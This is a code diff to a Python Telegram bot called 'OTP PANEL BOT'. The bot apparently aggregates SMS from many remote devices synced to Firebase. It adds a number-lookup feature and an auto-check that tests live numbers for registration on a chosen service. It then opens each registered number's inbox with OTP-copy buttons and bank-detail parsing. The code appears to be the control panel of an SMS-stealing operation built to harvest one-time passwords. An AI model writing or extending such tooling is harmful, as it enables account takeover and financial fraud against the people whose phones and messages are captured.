@@ -3,8 +3,7 @@
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — VANTAGE PRO + OMNIDIMENSION EDITION       
   FAST-SKIP LOGIC (HIT & RUN) | RAILWAY SMOOTH ENGINE
-  LIVE ERROR TRACKING | DEEP SYNC (150) | PLAYWRIGHT
-  1500+ PANELS AUTO-LOADER | ANTI-CRASH WEB SERVER
+  AUTO-CHECK INBOX LINKING | 1500+ PANELS AUTO-LOADER 
 ══════════════════════════════════════════════════════
 """
 
@@ -229,6 +228,7 @@ def load_data():
                 sorted_res = list(n_map.values())
                 sorted_res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
                 GLOBAL_DEVICE_CACHE["ALL"] = sorted_res
+                
                 if len(sorted_res) > 50:
                     SCAN_PROGRESS["completed"] = 99999 
                     SCAN_PROGRESS["total"] = 99999
@@ -482,6 +482,21 @@ async def fetch_db_data(tag: str, db_config: dict) -> Optional[list[Device]]:
         except Exception:
             return None 
 
+# 🔥 5-MIN & 30-MIN FRESH FIX (verify_recent_sms function restored) 🔥
+async def verify_recent_sms(device: Device, max_age_seconds=14400) -> bool:
+    try:
+        session = await get_http_session()
+        url = build_fb_url(device.base_url, device.sms_path, auth=device.auth, query='orderBy="%24key"&limitToLast=1')
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
+            if r.status == 200:
+                data = await r.json(content_type=None)
+                if isinstance(data, dict) and len(data) > 0:
+                    max_sms_ts = max((float(v.get("timestamp") or 0) for v in data.values() if isinstance(v, dict)), default=0)
+                    if max_sms_ts > 1e11: max_sms_ts /= 1000
+                    if max_sms_ts > 0 and (time.time() - max_sms_ts) <= max_age_seconds: return True
+    except: pass
+    return False
+
 async def check_number_api(service: str, number: str, retries=2) -> dict:
     clean_number = re.sub(r"\D", "", str(number))[-10:]
     api_keys = SYS_SETTINGS.get("api_keys", [])
@@ -580,6 +595,14 @@ async def find_device_by_id(dev_id: str, bot_token: str, chat_id: int, users_db:
             if d.id == dev_id: return d
     for d in await get_all_devices(bot_token, chat_id, users_db):
         if d.id == dev_id: return d
+    return None
+
+async def find_device_by_number(number: str, bot_token: str, chat_id: int, users_db: dict) -> Optional[Device]:
+    number = re.sub(r"\D", "", str(number))[-10:]
+    devices = await get_all_devices(bot_token, chat_id, users_db)
+    for d in devices:
+        for num in d.numbers:
+            if num.endswith(number): return d
     return None
 
 async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
@@ -728,12 +751,6 @@ def auto_forward_msg(sms: dict, num_label: str) -> str:
     if otp: return f"🔐 <b>NEW OTP RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\n│ OTP : {otp}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
     return f"📩 <b>NEW SMS RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\nNumber : {num_label}\nFrom : {sender}\nDate : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
 
-def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("View All Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Device Info", callback_data=f"info:{dev_id}")],
-        [InlineKeyboardButton("Disconnect & Back", callback_data="home")],
-    ])
-
 def admin_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("Grant Global Access", callback_data="sa_grant_global")],
@@ -780,7 +797,7 @@ async def show_fresh_page(message_obj, chat_id, page, bot_token, users_db, durat
 
     nav = []
     callback_prefix = "f5:" if duration_minutes == 5 else "f30:"
-    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"{callback_prefix}{page-1}"))
+    if page > 0: nav.append(InlineKeyboardButton("⬅ Prev", callback_data=f"{callback_prefix}{page-1}"))
     nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
     if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"{callback_prefix}{page+1}"))
     if nav: kb.append(nav)
@@ -936,7 +953,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 # ==========================================
-# 📩 CORE TELEGRAM HANDLERS (WITH GLOBAL ERROR TRACKING)
+# 📩 CORE TELEGRAM HANDLERS (WITH INBOX LINKING)
 # ==========================================
 
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1001,14 +1018,45 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             return
             
         protected_callbacks = ["open_app_search", "home", "online", "open_checker_menu", "open_auto_checker_menu"]
-        if data in protected_callbacks or data.startswith(("app_search:", "auto_fb:", "f5:", "f30:", "chk_srv:", "pg:", "sel:", "msgs:", "info:")):
+        if data in protected_callbacks or data.startswith(("app_search:", "auto_fb:", "f5:", "f30:", "chk_srv:", "pg:", "sel:", "msgs:", "info:", "search_num:")):
             async def edit_reply(txt, parse_mode="HTML"): await safe_edit(query, txt, parse_mode=parse_mode)
             if not await enforce_access(ctx, chat_id, edit_reply): return
             
+        # 🔥 FIX: DIRECTLY OPEN INBOX FROM AUTO-CHECK LIST 🔥
+        if data.startswith("search_num:"):
+            number = data.split(":")[1]
+            device = await find_device_by_number(number, bot_token, chat_id, users_db)
+            if not device:
+                await query.answer("Ye number abhi online nahi hai ya cache me nahi mila.", show_alert=True)
+                return
+                
+            user_focus.setdefault(bot_token, {})[chat_id] = device.id
+            label = device_label(device)
+            smss  = await get_device_sms(device)
+            back_btn = InlineKeyboardButton("🔙 Back to Results", callback_data="open_auto_checker_menu")
+            refresh_btn = InlineKeyboardButton("🔄 Refresh Inbox", callback_data=f"msgs:{device.id}")
+            
+            if not smss:
+                await safe_edit(query, f"📭 <b>Inbox Empty</b>\n📱 Number: {label}\nRefresh to check again.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="HTML")
+                return
+                
+            header = f"📩 DEEP INBOX SYNC (VANTAGE)\n━━━━━━━━━━━━━━━━━━\n📱 Number: {label}\n📄 Showing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n"
+            body_parts, otp_buttons = [], []
+            for sms in smss[:15]: 
+                block, otp, bank_info = format_sms_block(sms, label)
+                body_parts.append(block)
+                if otp: otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
+            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
+            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[Truncated]"
+            otp_buttons.append([refresh_btn, back_btn])
+            await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons), parse_mode="HTML")
+            return
+
         if data == "open_app_search":
             await safe_edit(query, "🍔 <b>SOCIAL & FOOD OTPs (Last 24h)</b>\n━━━━━━━━━━━━━━━━━━\nSelect an app below to deeply scan all devices for its OTPs:", reply_markup=get_app_search_menu(), parse_mode="HTML")
             return
 
+        # 🔥 FIX: AUTO CHECK LIST GENERATION WITH INLINE BUTTONS 🔥
         if data.startswith("auto_fb:"):
             service = data.split(":")[1]
             await safe_edit(query, f"⏳ <b>AUTO-CHECKING LIVE NUMBERS</b>\n━━━━━━━━━━━━━━━━━━\nScanning all online devices for <b>{service.capitalize()}</b>...\n<i>Please wait...</i>", parse_mode="HTML")
@@ -1022,6 +1070,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 
             target_nums = [d.numbers[0][-10:] for d in online_devs[:40]]
             bulk_results = []
+            kb_rows = []
             tasks = [check_number_api(service, num) for num in target_nums]
             res_list = await asyncio.gather(*tasks, return_exceptions=True)
             
@@ -1032,6 +1081,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 if is_reg:
                     found_registered += 1
                     bulk_results.append(f"🟢 <code>{num}</code> - Reg")
+                    kb_rows.append([InlineKeyboardButton(f"🟢 Open {num} Inbox", callback_data=f"search_num:{num}")])
                 else:
                     bulk_results.append(f"🔴 <code>{num}</code> - Unreg")
                     
@@ -1039,9 +1089,9 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 res_text = f"<b>📊 AUTO-CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n❌ API limit hit ya koi valid result nahi mila."
             else:
                 res_text = f"<b>📊 AUTO-CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n✅ Checked: {len(bulk_results)} | 🎯 Reg: {found_registered}\n\n" + "\n".join(bulk_results[:30])
-                    
-            kb = [[InlineKeyboardButton("🔄 Scan Again", callback_data=f"auto_fb:{service}"), InlineKeyboardButton("🏠 Back", callback_data="open_auto_checker_menu")]]
-            await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+            
+            kb_rows.append([InlineKeyboardButton("🔄 Scan Again", callback_data=f"auto_fb:{service}"), InlineKeyboardButton("🏠 Back", callback_data="open_auto_checker_menu")])
+            await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb_rows), parse_mode="HTML")
             return
 
         if data.startswith("app_search:"):
